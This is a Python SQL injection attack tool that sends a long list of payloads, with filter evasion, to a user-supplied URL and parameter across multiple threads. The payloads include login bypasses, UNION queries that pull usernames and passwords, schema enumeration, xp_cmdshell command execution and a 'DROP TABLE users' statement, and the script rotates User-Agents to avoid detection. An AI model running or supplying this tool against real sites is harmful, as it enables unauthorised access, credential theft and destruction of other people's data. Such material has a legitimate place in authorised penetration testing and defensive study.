import requests
import threading
import random
import time
import urllib.parse
import logging
from fake_useragent import UserAgent

# Logging configuration
logging.basicConfig(filename="sql_injection_report.log", level=logging.INFO, format="%(asctime)s - %(message)s")

# Comprehensive list of SQL Injection payloads
payloads = [
    # Basic Payloads
    "' OR 1=1 -- ",
    "' OR '1'='1' -- ",
    "\" OR \"1\"=\"1\" -- ",
    "' UNION SELECT null, null -- ",
    "' UNION SELECT 1, @@version -- ",
    "' AND 1=2 UNION SELECT null, table_name FROM information_schema.tables -- ",
    "' AND 1=2 UNION SELECT null, column_name FROM information_schema.columns -- ",
    "' UNION SELECT username, password FROM users -- ",
    
    # Error-based Payloads
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT database()),0x3a,(SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x) a) -- ",
    "' OR 1=CONVERT(int, (SELECT @@version)) -- ",
    
    # Time-based Blind SQL Injection
    "'; IF (1=1) WAITFOR DELAY '0:0:5' -- ",
    "'; IF (1=2) WAITFOR DELAY '0:0:5' -- ",
    
    # Union-based
    "' UNION SELECT NULL, NULL, NULL -- ",
    "' UNION SELECT 'a', 'b', 'c' -- ",
    "' UNION SELECT table_name, column_name FROM information_schema.columns -- ",
    
    # Boolean-based
    "' AND 1=1 -- ",
    "' AND 1=2 -- ",
    
    # Tautology-based
    "' OR 1=1#",
    "' OR '1'='1'#",
    
    # Advanced Payloads
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin' AND password = 'password') -- ",
    "' AND NOT 1=1 -- ",
    
    # Comment-based
    "'; -- ",
    "'#",
    
    # Other Techniques
    "' AND 1=(SELECT COUNT(*) FROM tabname); -- ",
    "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' -- ",
    "' UNION SELECT 1,2,3,4,5 -- ",
    "' AND (SELECT SLEEP(5)) -- ",
    
    # Additional Payloads for Coverage
    "' UNION SELECT NULL, NULL, NULL -- ",
    "' OR '1'='1' -- ",
    "' OR 1=1; -- ",
    "' AND 1=1; -- ",
    "' AND '1'='1'; -- ",
    "' OR 'a'='a'; -- ",
    "' OR 1=1 #",
    "' OR 1=1/*",
    "' AND 1=1/*",
    "' OR 1=1--",
    "' OR 1=1//",
    "'; EXEC xp_cmdshell('net user') -- ",
    "'; EXECUTE IMMEDIATE 'SELECT * FROM users' -- ",
    "'; DECLARE @x varchar(100); SET @x = (SELECT @@version); EXEC(@x); -- ",
    "'; DROP TABLE users; -- ",
    "'; CREATE TABLE test(id int); -- ",
    "'; DECLARE @t table(id int); INSERT INTO @t SELECT * FROM users; -- ",
    "'; SELECT * FROM users WHERE username = 'admin' AND password = 'password'; -- ",
]

# List of evasion techniques
def evade(payload):
    evasion_methods = [
        lambda x: x.replace(" ", "/**/"),
        lambda x: x.replace(" ", "%20"),
        lambda x: urllib.parse.quote(x),
        lambda x: x.replace("=", " LIKE "),
    ]
    return random.choice(evasion_methods)(payload)

# Generate a random User-Agent to avoid detection
def get_random_user_agent():
    ua = UserAgent()
    return {'User-Agent': ua.random}

# Function to attempt SQL injection
def attempt_sql_injection(url, param, payload):
    evaded_payload = evade(payload)
    full_url = f"{url}?{param}={evaded_payload}"
    headers = get_random_user_agent()
    
    try:
        response = requests.get(full_url, headers=headers, timeout=5)
        
        if "SQL syntax" in response.text or "error" in response.text:
            logging.info(f"Potential SQL Injection found with payload: {payload}")
            print(f"Potential SQL Injection found with payload: {payload}")
        else:
            logging.info(f"Attempt failed with payload: {payload}")
            print(f"Attempt failed with payload: {payload}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request failed: {e}")
        print(f"Request failed: {e}")

# Multithreaded attack function with controlled concurrency
def run_attack(url, param, max_threads=10):
    threads = []
    
    for payload in payloads:
        if len(threads) >= max_threads:
            for t in threads:
                t.join()
            threads.clear()
        
        t = threading.Thread(target=attempt_sql_injection, args=(url, param, payload))
        t.start()
        threads.append(t)
        time.sleep(0.5)  # Delay to prevent overwhelming the server

    for t in threads:
        t.join()

# Proxy support (optional)
def use_proxy():
    proxy = input("Enter proxy URL (leave blank for none): ")
    if proxy:
        proxies = {"http": proxy, "https": proxy}
        return proxies
    return None

# Banner and tool metadata
def print_banner():
    banner = """
    #######################################
    #     SQL Injection Testing Tool!    #
    #     Use at your own risk!          #
    #     By: Taylor Christian Newsome    #
    #######################################
    """
    print(banner)

# Main function to execute the attack
if __name__ == "__main__":
    print_banner()
    
    target_url = input("Enter target URL (without parameters): ").strip()
    target_param = input("Enter vulnerable parameter: ").strip()
    max_threads = int(input("Enter max number of concurrent threads (default 10): ") or 10)
    
    run_attack(target_url, target_param, max_threads)
    print("Attack complete. Check sql_injection_report.log for details.")
